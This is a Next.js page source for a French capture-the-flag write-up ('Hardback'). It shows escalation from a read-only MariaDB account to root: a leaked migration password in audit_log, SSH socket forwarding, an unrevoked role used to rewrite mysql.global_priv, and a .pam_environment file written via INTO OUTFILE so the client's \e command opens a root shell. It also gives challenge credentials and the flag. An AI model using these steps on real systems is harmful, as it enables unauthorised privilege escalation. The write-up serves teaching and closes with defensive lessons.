import Link from "next/link";
import {
  ArrowLeft,
  Terminal,
  Database,
  Key,
  Shield,
  Server,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { RevealFlagBlock } from "@/components/RevealFlag";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p
          className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}
        >
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Hardback | Writeup | 0xbbuddha",
  description:
    "Hardback : SSH qui m'ouvre MariaDB en lecture seule, jusqu'à root via un vieux secret dans les logs et une sandbox pas si étanche (Hack'In 2K26).",
};

export default function WriteupHardbackPage() {
  return (
    <div className="container mx-auto max-w-4xl px-4 py-12">
      <Button variant="ghost" size="sm" asChild className="mb-8 gap-2">
        <Link href="/writeups">
          <ArrowLeft className="size-4" />
          Retour aux writeups
        </Link>
      </Button>

      <article className="space-y-10">
        <header>
          <div className="flex flex-wrap gap-2 text-sm text-muted-foreground">
            <span className="font-mono text-primary">HackNight</span>
            <span>·</span>
            <span>Pwn / Privesc / Misconfiguration</span>
          </div>
          <h1 className="mt-2 font-mono text-3xl font-bold tracking-tight sm:text-4xl">
            Hardback
          </h1>
          <p className="mt-3 text-muted-foreground">
            Ici, pas de shell classique : dès que je me connecte en SSH, je me retrouve dans le client
            MariaDB avec l&apos;utilisateur <strong>viewer</strong>, qui ne peut que lire la base{" "}
            <strong>app</strong>. Au premier abord ça a l&apos;air verrouillé. Sauf qu&apos;il reste des
            traces de migration dans <strong>audit_log</strong>, un rôle <strong>migration</strong>{" "}
            trop permissif, et une sandbox cliente qui oublie un détail : la commande{" "}
            <strong>\e</strong>. Ajoutez un peu de PAM sur <strong>/root</strong>, et on finit en
            root sans jamais avoir eu un vrai prompt shell au départ.
          </p>
        </header>

        <section>
          <h2 className="mb-4 font-mono text-xl font-semibold">Énoncé</h2>
          <blockquote className="border-l-2 border-primary/40 pl-4 text-muted-foreground italic">
            The admin hardened everything after the last breach on goBack. No more admin account, no
            more special privileges. Just a read-only viewer on a locked-down database. Sometimes
            the most dangerous leftovers are the ones nobody remembers to clean up.
          </blockquote>
          <p className="mt-3 text-sm text-muted-foreground">
            Le ton est rassurant, les oublis dans la base le sont moins.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Accès SSH, puis MariaDB
          </h2>
          <CodeBlock title="Connexion">
{`ssh root@34.155.191.36 -p 32777`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Le challenge donne le mot de passe <strong>password</strong> pour l&apos;utilisateur{" "}
            <strong>root</strong> SSH, mais ce n&apos;est pas un shell Unix qui m&apos;attend : c&apos;est
            le client MariaDB, tout de suite.
          </p>
          <CodeBlock title="SQL : énumération">
{`SELECT USER(), CURRENT_USER();
SHOW GRANTS;
SHOW DATABASES;`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`USER()            CURRENT_USER()
viewer@localhost  viewer@localhost

GRANT USAGE ON *.* TO \`viewer\`@\`localhost\`
GRANT SELECT ON \`app\`.* TO \`viewer\`@\`localhost\`

Database
app
information_schema`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            2. Ce que raconte audit_log
          </h2>
          <p className="mb-3 text-muted-foreground">
            Avec uniquement du <strong>SELECT</strong> sur <strong>app</strong>, je liste les tables
            puis je lis <strong>audit_log</strong>. Les messages ressemblent à des notes d&apos;équipe :
            en réalité ils donnent un couple user / mot de passe et un rôle temporaire jamais révoqué.
          </p>
          <CodeBlock title="Tables schema app">
{`SELECT table_name
FROM information_schema.tables
WHERE table_schema='app'
ORDER BY 1;`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`audit_log
departments
employees`}
          </CodeBlock>
          <CodeBlock title="Contenu audit_log (résumé)" result>
{`Schema migration v2.3: created migration role with temporary mysql.* access
maintenance: schema-validator connecting dba/M1gr@t10n_DBA! for migration check
Migration role assigned to dba for schema validation
TODO: revoke migration role after v2.3 validation is complete`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Server className="size-5 text-primary" />
            3. Port forwarding + compte dba
          </h2>
          <p className="text-muted-foreground">
            Je ne peux toujours pas lancer un shell depuis la session SSH, mais rien n&apos;interdit de
            forwarder la socket MySQL vers ma machine : je me reconnecte en <strong>dba</strong> en
            local, comme si j&apos;étais sur la boîte.
          </p>
          <CodeBlock title="Terminal 1 : forward socket MySQL">
{`ssh -N -L 13307:/run/mysqld/mysqld.sock root@34.155.191.36 -p 32777`}
          </CodeBlock>
          <CodeBlock title="Terminal 2 : connexion dba">
{`MYSQL_PWD='M1gr@t10n_DBA!' mariadb -h 127.0.0.1 -P 13307 -u dba`}
          </CodeBlock>
          <CodeBlock title="SHOW GRANTS (dba, rôle inactif)" result>
{`GRANT \`migration\` TO \`dba\`@\`localhost\`
GRANT USAGE ON *.* TO \`dba\`@\`localhost\`
GRANT SELECT ON \`app\`.* TO \`dba\`@\`localhost\``}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            4. Activer migration, puis mysql.global_priv
          </h2>
          <CodeBlock title="Activation du rôle">
{`SET ROLE migration;
SHOW GRANTS;
SELECT CURRENT_ROLE();`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`CURRENT_ROLE()
migration

GRANT SELECT, RELOAD ON *.* TO \`migration\`
GRANT INSERT, UPDATE ON \`mysql\`.* TO \`migration\``}
          </CodeBlock>
          <p className="text-muted-foreground">
            Sur MariaDB 10.11, les privilèges globaux vivent en JSON dans{" "}
            <code className="text-sm">mysql.global_priv</code>. Pour <strong>dba</strong>, le champ{" "}
            <code className="text-sm">access</code> vaut <code className="text-sm">0</code> au départ.
            Je le remplace par le même masque que <strong>root</strong> (ici{" "}
            <code className="text-sm">549755813887</code>), je fais un{" "}
            <code className="text-sm">FLUSH PRIVILEGES</code>, et soudain <strong>dba</strong> ressemble
            à un compte admin complet côté SQL.
          </p>
          <CodeBlock title="Escalade">
{`SET ROLE migration;

UPDATE mysql.global_priv
SET Priv = JSON_SET(Priv, '$.access', 549755813887)
WHERE Host='localhost' AND User='dba';

FLUSH PRIVILEGES;`}
          </CodeBlock>
          <CodeBlock title="SHOW GRANTS après mise à jour" result>
{`GRANT ALL PRIVILEGES ON *.* TO \`dba\`@\`localhost\` ... WITH GRANT OPTION`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            5. Sandbox client et contournement \\e
          </h2>
          <p className="text-muted-foreground">
            Même après l&apos;élévation SQL, le SSH me garde dans le client en mode sandbox :{" "}
            <code className="text-sm">\!</code> est refusé. Par contre <code className="text-sm">\e</code>{" "}
            appelle toujours un éditeur externe. Quand <code className="text-sm">vi</code> n&apos;est pas
            là, l&apos;erreur du genre <code className="text-sm">sh: 1: vi: not found</code> confirme
            bien qu&apos;on shell-out quelque part : c&apos;est la brèche.
          </p>
          <CodeBlock title="Écriture PAM pour root (via FILE)" result>
{`SELECT 'EDITOR DEFAULT=/bin/sh'
INTO OUTFILE '/root/.pam_environment'
FIELDS ESCAPED BY ''
LINES TERMINATED BY '\\n';`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Grâce au privilège <strong>FILE</strong>, je dépose un petit{" "}
            <code className="text-sm">/root/.pam_environment</code> qui force{" "}
            <code className="text-sm">EDITOR=/bin/sh</code>. Au prochain login root,{" "}
            <code className="text-sm">pam_env</code> charge ça avant MariaDB : quand je tape{" "}
            <code className="text-sm">\e</code>, ce n&apos;est plus <code className="text-sm">vi</code>{" "}
            qui ouvre le buffer temporaire, c&apos;est un shell. Le contenu du buffer, c&apos;est moi qui
            le choisis (par exemple <code className="text-sm">id</code>, puis un{" "}
            <code className="text-sm">find</code> / <code className="text-sm">cat</code> pour le flag).
          </p>
          <CodeBlock title="Après reconnexion : dans le client" result>
{`id
# puis \\e → uid=0(root) ...`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 font-mono text-xl font-semibold">6. Flag</h2>
          <p className="text-muted-foreground">
            Même recette qu&apos;avant : j&apos;écris la commande dans le buffer du client, je lance{" "}
            <code className="text-sm">\e</code>, j&apos;admire la sortie. Le flag est dans le bloc
            ci-dessous si tu veux te spoiler.
          </p>
          <RevealFlagBlock title="Flag" result>
{`HNx05{2ea6a71c7990012206b70b79051e2227}`}
          </RevealFlagBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Pourquoi la défense ne tient pas</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li>
              Un mot de passe de migration traîne en clair dans <strong>audit_log</strong> : game over
              dès qu&apos;on lit les logs.
            </li>
            <li>
              Le rôle <strong>migration</strong> n&apos;a jamais été révoqué et permet d&apos;écrire dans{" "}
              <strong>mysql.*</strong>, donc de retoucher la mécanique des privilèges elle-même.
            </li>
            <li>
              La sandbox du client coupe beaucoup de commandes, mais pas <strong>\e</strong>, qui reste
              conçu pour parler au monde extérieur.
            </li>
            <li>
              Une fois SQL root à peu près équivalent admin,{" "}
              <code className="text-sm">SELECT ... INTO OUTFILE</code> sur{" "}
              <strong>/root/.pam_environment</strong> referme le cercle côté OS.
            </li>
          </ul>
        </section>
      </article>
    </div>
  );
}
